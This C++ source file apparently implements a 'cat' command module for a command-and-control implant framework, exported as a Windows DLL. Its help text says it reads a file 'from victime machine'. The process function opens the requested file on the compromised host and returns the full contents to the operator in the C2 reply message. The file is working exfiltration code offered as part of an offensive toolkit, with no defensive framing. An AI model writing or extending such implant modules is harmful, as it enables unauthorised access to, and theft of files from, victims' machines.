#include "Cat.hpp"

#include <cstring>

using namespace std;


const std::string moduleName = "cat";


#ifdef _WIN32

__declspec(dllexport) Cat* CatConstructor() 
{
    return new Cat();
}

#endif

Cat::Cat()
	: ModuleCmd(moduleName)
{
}

Cat::~Cat()
{
}

std::string Cat::getInfo()
{
	std::string info;
	info += "cat:\n";
	info += "Cat a file from victime machine\n";
	info += "exemple:\n";
	info += "- cat c:\\temp\\toto.exe\n";

	return info;
}

int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
	if (splitedCmd.size() == 2)
	{
		string inputFile = splitedCmd[1];

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	return 0;
}


int Cat::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	c2RetMessage.set_instruction(m_name);
	c2RetMessage.set_cmd("");
	c2RetMessage.set_inputfile(c2Message.inputfile());

	std::string inputFile = c2Message.inputfile();
	std::ifstream input(inputFile, std::ios::binary);
	if( input ) 
	{
		std::string buffer(std::istreambuf_iterator<char>(input), {});
		c2RetMessage.set_returnvalue(buffer);
	}
	else
	{
		c2RetMessage.set_returnvalue("Failed: Couldn't open file.");
	}

	return 0;
}

